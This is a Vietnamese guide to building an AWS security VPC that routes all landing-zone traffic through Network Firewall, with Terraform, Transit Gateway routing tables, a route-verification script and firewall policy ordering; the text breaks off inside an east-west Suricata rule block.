# Security VPC – mọi traffic của LZ đi qua AWS Network Firewall

Ví dụ 15: Một **security VPC** chuyên trách thanh tra, mọi traffic của mọi account trong Landing Zone đều phải đi qua nó — chiều ra, chiều vào, và giữa các account với nhau.

> Tài liệu chi tiết. Thiết kế tổng thể, quy hoạch CIDR chuẩn và bảng định tuyến Transit Gateway ở [17 – Network LZ Design Guide](./17-Network-LZ-Design-Guide.md).

Mở rộng [13 – Centralized Ingress/Egress](./13-Centralized-Ingress-Egress-Network.md) và [14 – Ingress Chain](./14-Ingress-Chain-CDN-PaloAlto-F5-WAF.md).

---

## 1. Ba loại luồng, đừng chỉ nghĩ tới chiều ra

"Mọi traffic đi qua firewall" gồm ba loại, và loại thứ ba hay bị quên:

| Luồng | Hướng | Ví dụ | Doc 13 đã xử lý? |
|---|---|---|---|
| **North-South ra** | Spoke → Internet | Lambda gọi API bên ngoài, `yum update` | Qua NAT, nhưng **chưa thanh tra** |
| **North-South vào** | Internet → App | Khách hàng gọi API | Chuỗi CDN→PA→F5 (doc 14) |
| **East-West** | Spoke ↔ Spoke | app-prod gọi data-prod | **Chặn** hoàn toàn, chưa thanh tra |

Doc 13 cách ly spoke bằng cách không propagate route giữa chúng. Đó là cách ly, không phải kiểm soát. Khi nghiệp vụ cần app-prod nói chuyện với data-prod, bạn cần **cho phép có kiểm soát** — và đó là việc của security VPC.

Chuyển từ *"chặn hết"* sang *"cho qua nhưng thanh tra và ghi log từng luồng"*.

---

## 2. Bốn VPC, mỗi cái một vai

Security VPC là VPC **thứ tư** trong network account, tách khỏi cả ingress lẫn egress:

| VPC | CIDR | Chứa | Vai trò |
|---|---|---|---|
| `ingress-vpc` | `10.0.0.0/16` | IGW, GWLB+Palo Alto, NLB, F5 | Luồng vào từ Internet (doc 14) |
| **`security-vpc`** | `10.1.0.0/16` | **Network Firewall** | **Thanh tra mọi luồng** |
| `egress-vpc` | `10.2.0.0/16` | IGW, NAT Gateway | Luồng ra Internet |
| `shared-vpc` | `10.3.0.0/16` | VPC endpoint tập trung | PrivateLink (doc 12) |

Security VPC **không có IGW, không có NAT**. Nó chỉ nhận traffic từ TGW, đưa qua firewall endpoint, rồi trả lại TGW. Đây là điểm khiến nó khác hẳn ba VPC còn lại: nó là một trạm trung chuyển thuần tuý, không có đường ra ngoài nào.

Tách như vậy có một cái giá cụ thể cần biết trước: **traffic đi qua TGW bốn lần cho một vòng đi-về** thay vì hai lần nếu gộp firewall vào egress VPC. Mục 8 tính con số. Đổi lại là ranh giới trách nhiệm rõ ràng và khả năng thay firewall mà không đụng tới đường egress.

---

## 3. Kiến trúc

```text
        INTERNET                                    INTERNET
            │                                           ▲
            ▼                                           │
┌───────────────────────┐                   ┌───────────┴───────────┐
│  INGRESS VPC          │                   │  EGRESS VPC           │
│  10.0.0.0/16          │                   │  10.2.0.0/16          │
│  IGW → PA → F5        │                   │  NAT GW × 2 → IGW     │
│  (doc 14)             │                   │  (doc 13)             │
└───────────┬───────────┘                   └───────────▲───────────┘
            │                                           │
            └──────────────┐         ┌──────────────────┘
                           ▼         ▼
              ┌────────────────────────────────┐
              │      TRANSIT GATEWAY           │
              │                                │
              │  rtb-spokes    0/0 → security  │
              │  rtb-security  ingress → ingress│
              │                partner → partner│
              │                0/0 → egress    │
              │                + học mọi spoke │
              │  rtb-egress    spoke → security│
              │  rtb-ingress   spoke → security│
              └───────┬────────────────┬───────┘
                      │                │
                      ▼                │
  ┌───────────────────────────────┐    │
  │  SECURITY VPC 10.1.0.0/16     │    │
  │  KHÔNG IGW, KHÔNG NAT         │    │
  │                               │    │
  │  subnet: tgw 10.1.20.0/28     │    │
  │   ┌─────────────────────────┐ │    │
  │   │ TGW attachment          │ │    │
  │   │ appliance_mode = ENABLE │ │    │
  │   └───────────┬─────────────┘ │    │
  │               │ 0.0.0.0/0     │    │
  │  subnet: firewall 10.1.10.0/28│    │
  │   ┌───────────▼─────────────┐ │    │
  │   │ AWS Network Firewall    │ │    │
  │   │ endpoint AZ-a, AZ-b     │ │    │
  │   │  • stateless: drop nhanh│ │    │
  │   │  • stateful: Suricata   │ │    │
  │   │  • TLS SNI allowlist    │ │    │
  │   └───────────┬─────────────┘ │    │
  │               │ 0.0.0.0/0 → TGW    │
  └───────────────┼───────────────┘    │
                  │                    │
                  └────────┬───────────┘
                           │
            ┌──────────────┼──────────────┐
            ▼              ▼              ▼
      ┌──────────┐  ┌──────────┐  ┌──────────┐
      │ app-dev  │  │ app-prod │  │ data-prod│
      │ 10.10/16 │  │ 10.20/16 │  │ 10.30/16 │
      └──────────┘  └──────────┘  └──────────┘

  app-prod → data-prod đi đường:
    app-prod → TGW → security-vpc → firewall → TGW → data-prod
```

Điểm mấu chốt: `rtb-spokes` chỉ có **một** route `0.0.0.0/0 → security attachment`. Route này phủ cả Internet **lẫn** các spoke khác. Spoke không có đường tắt nào.

---

## 4. `appliance_mode_support` – thiết lập quan trọng nhất

```hcl
resource "aws_ec2_transit_gateway_vpc_attachment" "security" {
  appliance_mode_support = "enable"   # ← thiếu dòng này là hỏng
}
```

Mặc định, TGW chọn AZ để chuyển gói theo AZ của nguồn. Với luồng east-west giữa hai spoke ở hai AZ khác nhau:

```text
KHÔNG bật appliance mode:
  app-prod (AZ-a)  → TGW → security AZ-a → firewall endpoint AZ-a
  data-prod (AZ-b) trả lời → TGW → security AZ-b → firewall endpoint AZ-b

  → Gói đi và gói về qua HAI endpoint khác nhau
  → Firewall stateful chỉ thấy nửa phiên → drop
  → Triệu chứng: chập chờn theo AZ, test lúc được lúc không

CÓ bật:
  TGW dùng flow hashing 5-tuple, cả hai chiều luôn tới CÙNG endpoint.
```

Đây là lỗi tốn nhiều thời gian gỡ nhất trong mô hình này. Đưa việc kiểm tra nó vào pipeline sau mỗi lần apply (xem mục 9, lệnh 9).

---

## 5. Terraform – Security VPC

```hcl
# 5-network/security-vpc.tf

locals {
  azs = { a = var.azs[0], b = var.azs[1] }

  security_subnets = {
    firewall = { a = "10.1.10.0/28", b = "10.1.11.0/28" }
    tgw      = { a = "10.1.20.0/28", b = "10.1.21.0/28" }
  }
}

resource "aws_vpc" "security" {
  provider             = aws.network
  cidr_block           = "10.1.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true

  tags = { Name = "${var.project}-security-vpc" }
}

# KHONG co aws_internet_gateway, KHONG co aws_nat_gateway o day.
# Security VPC chi la tram trung chuyen - moi duong ra deu qua TGW.

resource "aws_subnet" "security" {
  provider = aws.network
  for_each = merge([
    for tier, cidrs in local.security_subnets : {
      for az, cidr in cidrs : "${tier}-${az}" => {
        tier = tier
        az   = local.azs[az]
        cidr = cidr
      }
    }
  ]...)

  vpc_id                  = aws_vpc.security.id
  cidr_block              = each.value.cidr
  availability_zone       = each.value.az
  map_public_ip_on_launch = false

  tags = {
    Name = "${var.project}-security-${each.key}"
    Tier = each.value.tier
  }
}

resource "aws_ec2_transit_gateway_vpc_attachment" "security" {
  provider = aws.network

  transit_gateway_id = aws_ec2_transit_gateway.hub.id
  vpc_id             = aws_vpc.security.id
  subnet_ids         = [for k in ["a", "b"] : aws_subnet.security["tgw-${k}"].id]

  # BAT BUOC - xem muc 4
  appliance_mode_support = "enable"

  transit_gateway_default_route_table_association = false
  transit_gateway_default_route_table_propagation = false

  tags = { Name = "${var.project}-tgwa-security" }
}
```

### 5.1. Network Firewall

```hcl
resource "aws_networkfirewall_firewall" "main" {
  provider = aws.network

  name                = "${var.project}-fw"
  firewall_policy_arn = aws_networkfirewall_firewall_policy.main.arn
  vpc_id              = aws_vpc.security.id

  # Firewall chet la ca LZ mat mang - bao ve khoi xoa nham
  delete_protection                 = true
  subnet_change_protection          = true
  firewall_policy_change_protection = false

  dynamic "subnet_mapping" {
    for_each = toset(["a", "b"])
    content {
      subnet_id = aws_subnet.security["firewall-${subnet_mapping.value}"].id
    }
  }

  tags = { Name = "${var.project}-fw" }
}

# Lay endpoint ID theo tung AZ de dung trong route table
locals {
  fw_endpoints = {
    for s in tolist(aws_networkfirewall_firewall.main.firewall_status[0].sync_states) :
    s.availability_zone => s.attachment[0].endpoint_id
  }
}
```

### 5.2. Route table trong security VPC – chỉ hai bảng

Vì không có IGW/NAT, routing ở đây đơn giản hơn hẳn so với egress VPC:

```hcl
########################
# tgw subnet: mọi thứ đi vào firewall
########################

resource "aws_route_table" "security_tgw" {
  provider = aws.network
  for_each = toset(["a", "b"])
  vpc_id   = aws_vpc.security.id

  tags = { Name = "${var.project}-sec-tgw-rt-${each.key}" }
}

resource "aws_route" "sec_tgw_to_firewall" {
  provider = aws.network
  for_each = toset(["a", "b"])

  route_table_id         = aws_route_table.security_tgw[each.key].id
  destination_cidr_block = "0.0.0.0/0"
  vpc_endpoint_id        = local.fw_endpoints[local.azs[each.key]]
}

resource "aws_route_table_association" "security_tgw" {
  provider       = aws.network
  for_each       = toset(["a", "b"])
  subnet_id      = aws_subnet.security["tgw-${each.key}"].id
  route_table_id = aws_route_table.security_tgw[each.key].id
}

########################
# firewall subnet: thanh tra xong thì trả lại TGW
# TGW quyết định gói đi đâu tiếp - egress VPC hay spoke khác
########################

resource "aws_route_table" "security_firewall" {
  provider = aws.network
  for_each = toset(["a", "b"])
  vpc_id   = aws_vpc.security.id

  tags = { Name = "${var.project}-sec-fw-rt-${each.key}" }
}

resource "aws_route" "sec_fw_to_tgw" {
  provider = aws.network
  for_each = toset(["a", "b"])

  route_table_id         = aws_route_table.security_firewall[each.key].id
  destination_cidr_block = "0.0.0.0/0"
  transit_gateway_id     = aws_ec2_transit_gateway.hub.id

  depends_on = [aws_ec2_transit_gateway_vpc_attachment.security]
}

resource "aws_route_table_association" "security_firewall" {
  provider       = aws.network
  for_each       = toset(["a", "b"])
  subnet_id      = aws_subnet.security["firewall-${each.key}"].id
  route_table_id = aws_route_table.security_firewall[each.key].id
}
```

Hai route table, mỗi cái một dòng route. Toàn bộ độ phức tạp nằm ở TGW route table (mục 6), không nằm trong VPC.

---

## 6. TGW route table – nơi quyết định mọi thứ

Bốn route table, và **tính đối xứng** là yêu cầu bắt buộc: gói đi và gói về phải cùng đi qua firewall.

| Route table | Associate với | Propagate | Route tĩnh |
|---|---|---|---|
| `rtb-spokes` | Mọi spoke | — | `0.0.0.0/0` → **security** |
| `rtb-security` | security attachment | **Mọi spoke** | `ingress_vpc_cidr` → **ingress**<br>`partner_vpc_cidr` → **partner**<br>`0.0.0.0/0` → **egress** |
| `rtb-egress` | egress attachment | — | `spoke_supernet` → **security** |
| `rtb-ingress` | ingress attachment | — | `spoke_supernet` → **security** |

Hai quy tắc quyết định tính đúng đắn của bảng này:

**1. `rtb-egress` và `rtb-ingress` dùng route tĩnh trỏ về security, không propagate từ spoke.** Nếu propagate, gói trả về sẽ đi thẳng từ egress VPC tới spoke, **bỏ qua firewall** — luồng bất đối xứng và firewall stateful sẽ drop.

**2. `rtb-security` phải có route tĩnh cho *mọi* đích không phải spoke, đặt trước `0.0.0.0/0`.** Đây là chỗ dễ sót nhất:

> Nếu `rtb-security` chỉ có `0.0.0.0/0 → egress` và propagation từ spoke, thì gói trả lời từ app gửi cho F5 (đích `10.0.0.0/16`) sẽ khớp `0.0.0.0/0` và **bị đẩy sang egress VPC** thay vì quay về ingress VPC. Triệu chứng: request từ Internet vào tới app, app xử lý xong, nhưng client không bao giờ nhận được phản hồi.

Mỗi khi thêm một VPC mới vào network account (shared services, partner, DR…), phải thêm một route tĩnh tương ứng vào `rtb-security`. Route mặc định `0.0.0.0/0 → egress` chỉ dành cho Internet thật.

```hcl
# 5-network/tgw-routing.tf

resource "aws_ec2_transit_gateway_route_table" "security" {
  provider           = aws.network
  transit_gateway_id = aws_ec2_transit_gateway.hub.id
  tags               = { Name = "${var.project}-rtb-security" }
}

########################
# Association
########################

resource "aws_ec2_transit_gateway_route_table_association" "security" {
  provider                       = aws.network
  transit_gateway_attachment_id  = aws_ec2_transit_gateway_vpc_attachment.security.id
  transit_gateway_route_table_id = aws_ec2_transit_gateway_route_table.security.id
}

########################
# rtb-spokes: TAT CA ra security VPC
# Route nay phu ca Internet lan spoke khac
########################

resource "aws_ec2_transit_gateway_route" "spokes_to_security" {
  provider = aws.network

  destination_cidr_block         = "0.0.0.0/0"
  transit_gateway_attachment_id  = aws_ec2_transit_gateway_vpc_attachment.security.id
  transit_gateway_route_table_id = aws_ec2_transit_gateway_route_table.spokes.id
}

########################
# rtb-security: sau thanh tra, biet duong toi moi spoke,
# va Internet thi day sang egress VPC
########################

resource "aws_ec2_transit_gateway_route_table_propagation" "spokes_to_security" {
  provider = aws.network
  for_each = var.spoke_attachment_ids

  transit_gateway_attachment_id  = each.value
  transit_gateway_route_table_id = aws_ec2_transit_gateway_route_table.security.id
}

# Duong VE ingress VPC - BAT BUOC.
# Thieu route nay, goi tra loi cua app gui cho F5 se khop 0.0.0.0/0
# va bi day sang egress VPC -> client khong bao gio nhan duoc phan hoi.
resource "aws_ec2_transit_gateway_route" "security_to_ingress" {
  provider = aws.network

  destination_cidr_block         = var.ingress_vpc_cidr # 10.0.0.0/16
  transit_gateway_attachment_id  = aws_ec2_transit_gateway_vpc_attachment.ingress.id
  transit_gateway_route_table_id = aws_ec2_transit_gateway_route_table.security.id
}

# Chi nhung gi con lai - Internet that - moi di ra egress VPC
resource "aws_ec2_transit_gateway_route" "security_to_egress" {
  provider = aws.network

  destination_cidr_block         = "0.0.0.0/0"
  transit_gateway_attachment_id  = aws_ec2_transit_gateway_vpc_attachment.egress.id
  transit_gateway_route_table_id = aws_ec2_transit_gateway_route_table.security.id
}

########################
# rtb-egress: goi TRA VE phai quay lai security de thanh tra
# KHONG propagate tu spoke - do la loi lam luong bat doi xung
########################

resource "aws_ec2_transit_gateway_route" "egress_return_to_security" {
  provider = aws.network

  destination_cidr_block         = var.spoke_supernet
  transit_gateway_attachment_id  = aws_ec2_transit_gateway_vpc_attachment.security.id
  transit_gateway_route_table_id = aws_ec2_transit_gateway_route_table.egress.id
}

########################
# rtb-ingress: traffic tu F5 xuong app cung qua firewall
########################

resource "aws_ec2_transit_gateway_route" "ingress_to_security" {
  provider = aws.network

  destination_cidr_block         = var.spoke_supernet
  transit_gateway_attachment_id  = aws_ec2_transit_gateway_vpc_attachment.security.id
  transit_gateway_route_table_id = aws_ec2_transit_gateway_route_table.ingress.id
}
```

### 6.1. Ba luồng, đọc từng chặng

**Egress** — spoke gọi ra Internet:

```text
1. spoke → TGW              rtb-spokes: 0/0 → security
2. security tgw subnet      0/0 → firewall endpoint
3. firewall (thanh tra)
4. security firewall subnet 0/0 → TGW
5. TGW                      rtb-security: 0/0 → egress
6. egress VPC → NAT → IGW → Internet

Về:
7. Internet → IGW → NAT
8. egress public subnet     spoke_supernet → TGW
9. TGW                      rtb-egress: spoke_supernet → security
10. firewall (thanh tra lần hai)
11. TGW                     rtb-security: propagated → spoke
```

**East-West** — app-prod gọi data-prod:

```text
1. app-prod → TGW           rtb-spokes: 0/0 → security
2. firewall (thanh tra)
3. TGW                      rtb-security: propagated → data-prod
4. data-prod trả lời → TGW  rtb-spokes: 0/0 → security
5. firewall (thanh tra)
6. TGW → app-prod
```

**Ingress** — từ F5 xuống app:

```text
1. F5 → TGW                 rtb-ingress: spoke_supernet → security
2. firewall (thanh tra)
3. TGW                      rtb-security: propagated → app-prod
```

Cả ba luồng đều đối xứng. Đó là điều kiện để firewall stateful hoạt động đúng.

---

## 6.2. Ma trận luồng – kiểm chứng không sót đường nào

Yêu cầu "mọi traffic in/out và VPC-to-VPC đều qua firewall" chỉ đạt được nếu **liệt kê hết** các cặp nguồn-đích rồi kiểm tra từng cái. Bảng dưới là danh sách đầy đủ:

| # | Từ | Tới | Đi qua firewall? | Nhờ đâu |
|---|---|---|---|---|
| 1 | Spoke | Internet | ✅ | `rtb-spokes` 0/0 → security |
| 2 | Internet | Spoke (trả lời) | ✅ | `rtb-egress` spoke → security |
| 3 | Spoke A | Spoke B | ✅ | `rtb-spokes` 0/0 → security |
| 4 | Spoke B | Spoke A (trả lời) | ✅ | `rtb-spokes` 0/0 → security |
| 5 | Ingress VPC (F5) | Spoke | ✅ | `rtb-ingress` spoke → security |
| 6 | Spoke | Ingress VPC (trả lời) | ✅ | `rtb-spokes` 0/0 → security + `rtb-security` ingress_cidr → ingress |
| 7 | Partner VPC | Spoke | ✅ | `rtb-partner` 0/0 → security |
| 8 | Spoke | Partner VPC | ✅ | `rtb-spokes` 0/0 → security + `rtb-security` partner_cidr → partner |
| 9 | Spoke | Interface endpoint | ✅ | Endpoint đặt **trong security VPC** — xem 6.3 |
| 10 | Spoke | Gateway endpoint (S3/DynamoDB) | ❌ **Không** | Không rời VPC — xem 6.4 |
| 11 | Subnet A | Subnet B (**cùng** một VPC) | ❌ **Không** | Không đi qua TGW — xem 6.4 |
| 12 | Lambda ngoài VPC | Bất kỳ đâu | ❌ **Không** | Hạ tầng AWS quản lý — xem 6.4 |

Chín trong mười hai luồng được thanh tra. Ba luồng còn lại **về mặt kỹ thuật không thể** ép qua Network Firewall — mục 6.4 nói cách xử lý chúng.

Kiểm tra bảng này bằng lệnh, đừng tin vào sơ đồ:

```bash
#!/usr/bin/env bash
# Xac nhan MOI route table cua TGW deu tro ve security attachment.
# Chay sau moi lan thay doi ha tang mang.
set -uo pipefail

REGION=ap-southeast-1
SEC_ATT=$(aws ec2 describe-transit-gateway-attachments --region $REGION \
  --filters "Name=tag:Name,Values=acme-tgwa-security" \
  --query 'TransitGatewayAttachments[0].TransitGatewayAttachmentId' --output text)

for rtb_name in acme-rtb-spokes acme-rtb-egress acme-rtb-ingress acme-rtb-partner; do
  RTB=$(aws ec2 describe-transit-gateway-route-tables --region $REGION \
    --filters "Name=tag:Name,Values=$rtb_name" \
    --query 'TransitGatewayRouteTables[0].TransitGatewayRouteTableId' --output text)

  [[ "$RTB" == "None" ]] && continue

  echo "=== $rtb_name ==="
  aws ec2 search-transit-gateway-routes --region $REGION \
    --transit-gateway-route-table-id "$RTB" \
    --filters "Name=state,Values=active" \
    --query "Routes[].[DestinationCidrBlock,TransitGatewayAttachments[0].TransitGatewayAttachmentId]" \
    --output text | while read -r cidr att; do

      if [[ "$att" == "$SEC_ATT" ]]; then
        printf '  \033[32mOK\033[0m    %-18s -> security\n' "$cidr"
      else
        printf '  \033[31mBYPASS\033[0m %-18s -> %s\n' "$cidr" "$att"
      fi
    done
done
```

Mọi dòng `BYPASS` trong `rtb-spokes`, `rtb-egress`, `rtb-ingress`, `rtb-partner` là một đường lọt firewall. Ngoại lệ duy nhất hợp lệ: `rtb-security` (đương nhiên không trỏ về chính nó).

---

## 6.3. Đặt VPC endpoint ở đâu để vẫn được thanh tra

Doc 12 đề xuất đặt interface endpoint tập trung ở một shared services VPC. Với yêu cầu "mọi VPC-to-VPC qua firewall", cách đó tạo thêm một chặng TGW nữa và tốn tiền vô ích.

**Đặt interface endpoint ngay trong security VPC** là cách gọn hơn:

```hcl
resource "aws_subnet" "security_endpoints" {
  provider = aws.network
  for_each = toset(["a", "b"])

  vpc_id            = aws_vpc.security.id
  cidr_block        = each.key == "a" ? "10.1.30.0/24" : "10.1.31.0/24"
  availability_zone = local.azs[each.key]

  tags = { Name = "${var.project}-security-vpce-${each.key}", Tier = "endpoints" }
}

resource "aws_vpc_endpoint" "interface" {
  provider = aws.network
  for_each = toset(var.interface_endpoint_services)

  vpc_id              = aws_vpc.security.id
  service_name        = "com.amazonaws.${var.region}.${each.value}"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = [for k in ["a", "b"] : aws_subnet.security_endpoints[k].id]
  security_group_ids  = [aws_security_group.endpoints.id]
  private_dns_enabled = false

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = "*"
      Action    = "*"
      Resource  = "*"
      Condition = {
        StringEquals = { "aws:PrincipalOrgID" = var.organization_id }
      }
    }]
  })
}

# Subnet endpoint dung route table rieng: chi co local route.
# Traffic den day da qua firewall roi, khong can di dau nua.
resource "aws_route_table" "security_endpoints" {
  provider = aws.network
  for_each = toset(["a", "b"])
  vpc_id   = aws_vpc.security.id

  tags = { Name = "${var.project}-sec-vpce-rt-${each.key}" }
}

resource "aws_route" "sec_vpce_to_tgw" {
  provider = aws.network
  for_each = toset(["a", "b"])

  route_table_id         = aws_route_table.security_endpoints[each.key].id
  destination_cidr_block = var.spoke_supernet
  transit_gateway_id     = aws_ec2_transit_gateway.hub.id
}
```

Đường đi trở thành:

```text
spoke → TGW → security tgw subnet → firewall endpoint → firewall subnet
     → route local 10.1.30.0/24 → interface endpoint
```

Traffic **được thanh tra** và **không tốn thêm chặng TGW** nào. Gọn hơn hẳn so với để endpoint ở shared services VPC.

Đổi lại: PHZ của các endpoint này phải associate với mọi spoke VPC (cross-account authorization như [doc 12 mục 6](./12-DNS-va-VPC-Endpoint-Tap-Trung-AWS-Only.md)), và security VPC giờ mang thêm một vai trò nữa ngoài thanh tra.

---

## 6.4. Ba luồng không thể ép qua firewall

Đây là giới hạn kỹ thuật, không phải thiếu sót cấu hình. Cần biết để không báo cáo sai lên lãnh đạo.

### Luồng 10 – Gateway endpoint (S3, DynamoDB)

Gateway endpoint là một mục trong route table, traffic **không bao giờ rời khỏi VPC**. Không có cách nào đưa nó qua Network Firewall.

| Xử lý | Cách làm |
|---|---|
| Endpoint policy | Chỉ cho phép bucket/table trong org, chặn `s3:*` tới bucket lạ |
| SCP | Chặn `s3:PutBucketPolicy` mở public |
| CloudTrail data event | Ghi log truy cập S3 để audit sau |

```hcl
resource "aws_vpc_endpoint" "s3_gateway" {
  # ...
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid       = "AllowOrgBucketsOnly"
        Effect    = "Allow"
        Principal = "*"
        Action    = ["s3:GetObject", "s3:PutObject", "s3:ListBucket"]
        Resource  = "*"
        Condition = {
          StringEquals = { "aws:ResourceOrgID" = var.organization_id }
        }
      }
    ]
  })
}
```

`aws:ResourceOrgID` là lớp chống exfil quan trọng nhất ở đây: nhân viên nội bộ không copy được dữ liệu sang bucket S3 của tài khoản cá nhân, dù traffic không qua firewall.

### Luồng 11 – Traffic trong cùng một VPC

Gói tin giữa hai subnet của cùng một VPC đi qua router nội bộ của VPC, không chạm TGW. Ba cách xử lý:

| Cách | Mô tả | Đánh đổi |
|---|---|---|
| **Security group** (thực tế nhất) | SG tham chiếu SG, chặt chẽ theo tier | Không có IPS, không có log nội dung |
| **GWLB endpoint trong spoke VPC** | Chèn appliance ngay trong VPC | Rất tốn kém, nhân theo số VPC |
| **Một tier một VPC** | Tách app/data thành VPC riêng → thành east-west | Nhiều VPC hơn, nhiều attachment hơn |

Cách thứ ba đáng cân nhắc nếu yêu cầu tuân thủ nghiêm ngặt: tách `app-prod` và `data-prod` thành hai VPC (đúng như thiết kế ở doc này) thì traffic giữa chúng **tự động** trở thành east-west và được firewall thanh tra. Đây là lý do kiến trúc chia VPC theo tier, không chỉ theo môi trường.

Bổ sung **VPC Flow Logs** cho traffic nội bộ VPC, đẩy về log-archive — không thanh tra được nhưng ít nhất có dấu vết.

### Luồng 12 – Lambda không đặt trong VPC

Chạy trên hạ tầng mạng do AWS quản lý, có Internet mặc định, SCP không chạm tới.

| Xử lý | Cách làm |
|---|---|
| Bắt buộc Lambda vào VPC | SCP chặn `lambda:CreateFunction` khi thiếu `lambda:VpcIds` |
| Chấp nhận có kiểm soát | Giới hạn IAM role của Lambda, ghi log CloudTrail |

```json
{
  "Sid": "DenyLambdaWithoutVpc",
  "Effect": "Deny",
  "Action": ["lambda:CreateFunction", "lambda:UpdateFunctionConfiguration"],
  "Resource": "*",
  "Condition": {
    "Null": { "lambda:VpcIds": "true" }
  }
}
```

Cân nhắc kỹ trước khi bật SCP này: đưa Lambda vào VPC làm cold start lâu hơn, cần VPC endpoint cho mọi service Lambda gọi, và tốn thêm tiền. Với các ví dụ 01–05 trong repo này, toàn bộ Lambda đang chạy ngoài VPC. Đây là quyết định kiến trúc nên ghi thành ADR, không phải quyết định vặt.

---

## 7. Firewall policy và rule group

### 7.0. Ba engine, và cách policy được đánh giá

Network Firewall là **Suricata chạy như dịch vụ AWS**. Bên trong có ba engine, mỗi cái nhìn thấy một thứ khác nhau:

| Engine | Nhìn thấy | Dùng để |
|---|---|---|
| **Stateless** | 5-tuple: IP nguồn/đích, port, protocol | Loại rác trước khi tốn CPU của stateful. Như NACL nhưng nhanh hơn |
| **Stateful** | Cả **phiên** — gói này thuộc kết nối nào, chiều nào, đã bắt tay chưa | Toàn bộ rule east-west |
| **Domain list** | TLS **SNI** và HTTP **Host** | Allowlist domain ra Internet |

Stateful là thứ đáng tiền. Nó theo dõi trạng thái TCP, nên `pass` **một chiều** là gói trả về tự động được cho qua — đó là lý do rule chỉ khai chiều gọi. Khai thêm chiều ngược là mở một đường thật sự mới, hiếm khi là ý của người khai.

#### Thứ tự đánh giá

Ở `STRICT_ORDER`, duyệt từ **ưu tiên nhỏ đến lớn**, trong mỗi group duyệt theo `sid`. **Hành động kết thúc** (`pass` / `drop` / `reject`) dừng đánh giá ngay tại đó. `alert` **không** kết thúc — nó ghi log rồi đi tiếp.

```
gói tin → [100] → [150] → [200] → stateful_default_actions
           ↑ pass ở đây thì không bao giờ tới 150 hay 200
```

Đó là lý do rule catch-all cuối cùng dùng `alert` chứ không phải `pass`: nó ghi lại **mọi luồng nội bộ không khớp rule nào ở trên** mà không tự cho qua. Log của riêng `sid` đó là bản đồ thật về ai đang gọi ai — chính là thứ để dựng danh sách rule trước khi chuyển `drop`.

#### Ví dụ đang chạy thật

`landing-zone/network` sau khi nối [lớp vận hành](./25-Van-hanh-Network-Hang-Ngay.md):

| Ưu tiên | Rule group | Capacity | Nội dung |
|---|---|---|---|
| **100** | `<project>-east-west` | 100 | Luồng **hạ tầng** (NLB→app sid 1800, SSM→endpoint sid 1810), mesh đo đường, catch-all `alert` sid 1999 |
| **150** | `<project>-ops-east-west` | 1000 | Sinh từ catalog YAML của lớp `ops/` |
| **200** | `<project>-egress-domains` | 200 | Allowlist domain, khớp TLS SNI / HTTP Host |

**Thứ tự này là load-bearing, không phải sắp cho gọn.**

*150 phải sau 100.* Rule group 100 chứa hai luồng hạ tầng. Nếu lớp ops được đọc trước, một rule trong catalog có thể trùm lên `sid 1810` và làm **mất SSM ở mọi spoke** — mà SSM là đường duy nhất vào instance để sửa. `verify.sh` mục 9 kiểm đúng điều kiện này.

*200 phải sau cùng — và đây là chỗ tinh tế nhất.* Rule group domain có `HOME_NET = 10.0.0.0/8`, tức nó đánh giá **cả luồng east-west nội bộ**, không chỉ luồng ra Internet. Một `curl` từ spoke này sang IP của spoke kia không có SNI/Host nào khớp allowlist. Nó không bị chặn **chỉ vì** group 100 và 150 đã `pass` trước đó. Đảo 200 lên đầu là east-west chết sạch, và triệu chứng đọc như "firewall chặn nhầm" chứ không chỉ vào thứ tự.

#### Capacity — đặt rộng ngay từ đầu

Capacity là số "chỗ" xử lý mà rule group **giữ trước**, tính theo số tổ hợp `nguồn × đích × port`. Không phải số rule đang có.

**Capacity là bất biến.** Sửa nó là Terraform xoá và tạo lại rule group → ARN mới → policy tham chiếu một ARN đã biến mất, và apply hỏng giữa chừng. Capacity không dùng tốn **$0** — Network Firewall tính tiền theo giờ endpoint và GB xử lý. Nên để rộng ngay là lựa chọn đúng, không phải lãng phí.

Giới hạn: **30.000** capacity cho toàn bộ phần stateful của một policy.

```hcl

resource "aws_networkfirewall_firewall_policy" "main" {
  provider = aws.network
  name     = "${var.project}-policy"

  firewall_policy {
    # Stateless: loai bo rac truoc khi ton CPU cho stateful
    stateless_default_actions          = ["aws:forward_to_sfe"]
    stateless_fragment_default_actions = ["aws:forward_to_sfe"]

    stateless_rule_group_reference {
      priority     = 10
      resource_arn = aws_networkfirewall_rule_group.stateless_drop.arn
    }

    # STRICT_ORDER de rule priority co y nghia
    stateful_engine_options {
      rule_order = "STRICT_ORDER"
    }

    # Xem muc 11: giai doan dau dung ["aws:alert_established"] thoi
    stateful_default_actions = [
      "aws:drop_established",
      "aws:alert_established",
    ]

    stateful_rule_group_reference {
      priority     = 100
      resource_arn = aws_networkfirewall_rule_group.east_west.arn
    }

    stateful_rule_group_reference {
      priority     = 200
      resource_arn = aws_networkfirewall_rule_group.egress_domains.arn
    }

    # Chu ky managed cua AWS - tham chieu truc tiep bang ARN
    stateful_rule_group_reference {
      priority     = 300
      resource_arn = "arn:aws:network-firewall:${var.region}:aws-managed:stateful-rulegroup/MalwareDomainsStrictOrder"
    }

    stateful_rule_group_reference {
      priority     = 310
      resource_arn = "arn:aws:network-firewall:${var.region}:aws-managed:stateful-rulegroup/ThreatSignaturesBotnetStrictOrder"
    }
  }
}
```

Kiểm tra tên rule group managed hiện có trước khi dùng:

```bash
aws network-firewall list-rule-groups --scope MANAGED \
  --managed-type AWS_MANAGED_THREAT_SIGNATURES --region ap-southeast-1
```

### 7.1. East-West – khai báo spoke nào nói chuyện với spoke nào

```hcl
resource "aws_networkfirewall_rule_group" "east_west" {
  provider = aws.network
  capacity = 200
  name     = "${var.project}-east-west"
  type     = "STATEFUL"

  rule_group {
    stateful_rule_options {
      rule_order = "STRICT_ORDER"
    }

    rules_source {
      rules_string = <<-EOT
        # app-prod -> data-prod, chi PostgreSQL
        pass tcp 10.20.0.0/16 any -> 10.30.0.0/16 5432 (msg:"app-prod to data-prod postgres"; sid:1001; rev:1;)

        # app-prod -> shared services, chi HTTPS
        pass tcp 10.20.0.0/16 any -> 10.3.0.0/16 443 (msg:"app-prod to shared https"; sid:1002; rev:1;)

        # ICMP noi bo de troubleshoot
        pass icmp 10.0.0.0/8 any -> 10.0.0.0/8 any (msg:"internal icmp"; sid:1003; rev:1;)

